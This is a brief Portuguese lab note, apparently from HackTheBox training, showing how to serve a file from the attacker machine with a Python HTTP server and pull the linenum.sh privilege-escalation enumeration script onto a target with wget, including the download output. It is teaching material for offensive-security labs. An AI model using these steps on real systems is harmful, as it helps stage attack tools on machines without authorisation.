# Transferindo-Arquivos

MAQUINA HOST
-
Gust4vo@htb[/htb]$ cd /tmp </br>
Gust4vo@htb[/htb]$ python3 -m http.server 8000

 MAQUINA ALVO
 -
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh </br>
...SNIP... </br>
Saving to: 'linenum.sh' </br>
linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s </br>
2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337] </br>

